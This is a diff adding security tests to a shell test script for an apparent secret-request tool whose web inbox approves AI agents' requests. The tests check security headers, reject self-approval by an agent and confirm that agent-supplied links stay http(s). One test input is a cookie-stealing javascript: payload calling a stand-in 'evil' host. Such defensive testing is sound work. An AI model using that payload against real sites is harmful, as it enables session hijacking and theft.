@@ -229,6 +229,30 @@ grep -q "BIGCANARY" "$PROJ/.env.local" && { echo "FAIL: a truncated oversized an
 "$TS" tasks --json | python3 -c "import json,sys;sys.exit(0 if [t for t in json.load(sys.stdin) if t.get('name')=='BIG_TARGET_KEY' and t['status']=='pending'] else 1)" \
   || { echo "FAIL: the oversized answer changed the task state"; exit 1; }
 
+# every page carries the headers that keep it inert and un-embeddable
+head=$(curl -s -D - -o /dev/null -b "$JAR" "http://127.0.0.1:$PORT/t/$ETID")
+printf '%s' "$head" | grep -qi "content-security-policy: default-src 'none'" || { echo "FAIL: no restrictive CSP on an inbox page"; exit 1; }
+printf '%s' "$head" | grep -qi "x-frame-options: DENY" || { echo "FAIL: the inbox page can be framed"; exit 1; }
+printf '%s' "$head" | grep -qi "referrer-policy: no-referrer" || { echo "FAIL: the inbox page leaks a referrer"; exit 1; }
+
+# a link an agent chose is never rendered as anything but http(s): the inbox origin holds the
+# session that approves grants, so a javascript: href there is a full compromise of it
+"$TS" need JS_LINK_KEY --agent ci --why "link test" --url "javascript:fetch('//evil/'+document.cookie)" >"$OUT/need-jslink.txt" 2>&1 || true
+JTID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('name')=='JS_LINK_KEY'][0]['id'])")
+curl -fsS -b "$JAR" -o "$WEB/jslink.html" "http://127.0.0.1:$PORT/t/$JTID"
+grep -qi "javascript:" "$WEB/jslink.html" && { echo "FAIL: an agent-supplied javascript: link reached the page"; exit 1; }
+
+# an agent cannot approve its own card from the shell either — the CLI path has the same
+# guard the paste-scope session does
+"$TS" need STRIPE_SECRET_KEY --agent ci --why "self-approve test" >"$OUT/need-appr.txt" 2>&1 || true
+ATID=$("$TS" tasks --json | python3 -c "import json,sys;print([t for t in json.load(sys.stdin) if t.get('kind')=='approval'][0]['id'])" 2>/dev/null || true)
+if [ -n "${ATID:-}" ]; then
+  TOKENSTASH_AGENT=claude-code "$TS" answer "$ATID" --allow >"$OUT/self-approve.txt" 2>&1 && { echo "FAIL: an agent approved its own card"; exit 1; }
+  grep -q "person at a terminal" "$OUT/self-approve.txt" || { echo "FAIL: the refusal does not explain itself"; cat "$OUT/self-approve.txt"; exit 1; }
+  "$TS" tasks --json | python3 -c "import json,sys;sys.exit(0 if [t for t in json.load(sys.stdin) if t['id']=='$ATID' and t['status']=='pending'] else 1)" \
+    || { echo "FAIL: the refused approval changed the card"; exit 1; }
+fi
+
 # the real thing
 GOOD="sk-GOODCANARY-$(date +%s)-0123456789abcdef"
 curl -fsS -c "$JAR" -b "$JAR" -L -o "$WEB/answered.html" \
